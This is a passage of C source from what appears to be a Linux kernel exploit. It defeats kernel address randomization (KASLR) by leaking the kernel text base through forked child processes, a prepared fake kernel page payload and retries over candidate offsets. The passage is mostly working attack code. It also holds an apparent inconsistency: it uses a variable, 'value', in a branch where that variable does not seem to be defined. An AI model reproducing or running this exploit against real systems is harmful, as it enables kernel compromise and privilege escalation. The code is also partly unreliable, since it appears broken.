#if defined(PHYS_VIRTUAL_BASE_ORACLE) && PHYS_VIRTUAL_BASE_ORACLE
    const char *virtual_base_arg = getenv("SLIDE_VIRTUAL_BASE");
    if (virtual_base_arg && *virtual_base_arg) {
      char *base_end = NULL;
      errno = 0;
      unsigned long long virtual_base =
          strtoull(virtual_base_arg, &base_end, 0);
      slide_p0_offset = (uintptr_t)value;
      if (errno || base_end == virtual_base_arg || *base_end ||
          !slide_commit_virtual_base(virtual_base, "forced-virtual")) {
        pr_error("slide invalid forced virtual base=%s\n", virtual_base_arg);
        return 0;
      }
      return 1;
    }
    return slide_leak_virtual_base((uintptr_t)value);
#else
    return slide_commit_stext(KIMAGE_TEXT_BASE + value, "forced");
#endif
  }
  return slide_leak_physical_base();
#else
  const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
  uintptr_t forced_offset = 0;
  int forced = forced_offset_arg && *forced_offset_arg;
  if (forced) {
    char *end = NULL;
    errno = 0;
    unsigned long long value = strtoull(forced_offset_arg, &end, 0);
    if (errno || end == forced_offset_arg || *end || value > 0x1f0000ULL ||
        (value & (SLIDE_KASLR_STEP - 1)) != 0) {
      pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
      return 0;
    }
    forced_offset = (uintptr_t)value;
    pr_info("slide forced p0 offset=%08zx\n", forced_offset);
    return slide_commit_stext(
        KIMAGE_TEXT_BASE + forced_offset, "forced");
  }

  uint64_t existing_stext = slide_read_stext();
  if (existing_stext && slide_commit_stext(existing_stext, "boot_id")) {
    pr_success("slide boot_id kaslr leak succeeded pid=%d base=%016llx "
               "slide=%016llx\n",
               getpid(), (unsigned long long)kaslr_base,
               (unsigned long long)kaslr_slide);
    return 1;
  }

  int max_attempts = forced ? 1 : SLIDE_MAX_ATTEMPTS;
#if defined(SLIDE_P0_OFFSET_CANDIDATES)
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
  if (!page_base) {
    return 0;
  }
#endif
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    if (forced) {
      slide_p0_offset = forced_offset;
    } else {
#ifdef SLIDE_P0_OFFSET_CANDIDATES
      slide_p0_offset = slide_p0_offsets[
          (size_t)(attempt - 1) %
          (sizeof(slide_p0_offsets) / sizeof(slide_p0_offsets[0]))];
#else
      slide_p0_offset = 0;
#endif
    }
    pr_info("slide attempt %d/%d p0_offset=%08zx logger_parent=%016llx "
            "bootid_target=%016llx\n",
            attempt, max_attempts, slide_p0_offset,
            (unsigned long long)(SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset),
            (unsigned long long)(
                SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset));
#if defined(SLIDE_P0_OFFSET_CANDIDATES)
    if (!select_slide_payload_slot(slide_p0_offset)) {
      pr_error("slide payload slot missing p0_offset=%08zx\n",
               slide_p0_offset);
      return 0;
    }
#else
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
    if (!page_base || !fake_lock) {
      continue;
    }
#endif

    int raw_fds[2];
    SYSCHK(pipe(raw_fds));
    int fds[2];
    fds[0] = SYSCHK(fcntl(raw_fds[0], F_DUPFD, SLIDE_PSELECT_NFDS + 128));
    fds[1] = SYSCHK(fcntl(raw_fds[1], F_DUPFD, SLIDE_PSELECT_NFDS + 129));
    SYSCHK(close(raw_fds[0]));
    SYSCHK(close(raw_fds[1]));

    pid_t child = SYSCHK(fork());
    if (child == 0) {
      SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
      if (getppid() == 1) {
        _exit(1);
      }
      SYSCHK(close(fds[0]));
      disable_rseq_for_thread();
      slide_log_child_context();
      uint64_t stext = slide_child_leak_stext();
      if (stext) {
        SYSCHK(write(fds[1], &stext, sizeof(stext)));
        _exit(0);
      }
      _exit(1);
    }

    SYSCHK(close(fds[1]));
    uint64_t stext = 0;
    ssize_t n = read(fds[0], &stext, sizeof(stext));
    SYSCHK(close(fds[0]));
    int status = 0;
    SYSCHK(waitpid(child, &status, 0));
    if (n != (ssize_t)sizeof(stext) || !WIFEXITED(status) ||
        WEXITSTATUS(status) != 0 || !stext) {
      pr_warning("slide attempt %d failed n=%zd status=%d\n",
                 attempt, n, status);
      continue;
    }

    if (slide_commit_stext(stext, "pselect")) {
      return 1;
    }
  }

  return 0;
#endif
}
#endif /* !defined(NON_APP) */
